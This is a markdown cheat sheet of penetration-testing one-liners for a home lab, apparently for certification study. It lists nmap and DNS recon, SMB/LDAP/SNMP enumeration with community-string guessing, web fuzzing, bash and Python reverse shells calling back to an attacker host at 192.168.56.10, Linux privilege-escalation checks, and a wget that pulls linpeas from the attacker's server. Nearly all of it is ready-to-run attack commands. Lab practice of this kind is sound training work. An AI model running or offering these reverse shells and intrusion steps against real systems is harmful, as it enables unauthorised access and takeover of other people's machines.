# Handy One-Liners

Fast, real commands for the lab. **Lab targets only** (`192.168.56.0/24`, docker range `localhost:8081-8084`).

## Recon / scanning

```bash
# Quick host + top-ports sweep
nmap -sn 192.168.56.0/24 && nmap -sS -sV --top-ports 100 192.168.56.20

# Grab banners without nmap
nc -nv 192.168.56.20 21
curl -sI http://localhost:8081

# DNS enum (against domains you own / lab)
dig axfr @<nsserver> example.lab        # zone transfer attempt
dnsrecon -d example.lab
```

## SMB / AD enumeration

```bash
enum4linux-ng 192.168.56.20
smbclient -L //192.168.56.20 -N        # list shares, null session
rpcclient -U "" -N 192.168.56.20       # then: enumdomusers, querydominfo
crackmapexec smb 192.168.56.0/24       # or: netexec smb ...
ldapsearch -x -H ldap://192.168.56.30 -b "dc=ceh,dc=lab"
```

## SNMP

```bash
snmpwalk -v2c -c public 192.168.56.20
onesixtyone -c community.txt 192.168.56.20   # guess community strings
```

## Web

```bash
whatweb http://localhost:8081
nikto -h http://localhost:8081
gobuster dir -u http://localhost:8081 -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://localhost:8081/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

## Reverse shells (catch on Kali 192.168.56.10)

```bash
# Listener
nc -lvnp 4444

# Bash (from a foothold you already have — lab only)
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.56.10",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'

# Upgrade a dumb shell to a pty
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Linux privesc quick checks

```bash
id ; sudo -l
find / -perm -4000 -type f 2>/dev/null     # SUID
getcap -r / 2>/dev/null                     # capabilities
crontab -l ; cat /etc/crontab               # cron jobs
uname -a                                    # kernel (match to exploit)
```

## File transfer

```bash
# On attacker: serve files
python3 -m http.server 8000
# On target: pull
wget http://192.168.56.10:8000/linpeas.sh -O /tmp/l.sh
```

> Recon/enumeration credential handling: never paste real privileged creds into shared history; use a scratch, git-ignored `loot/` dir (already in `.gitignore`).
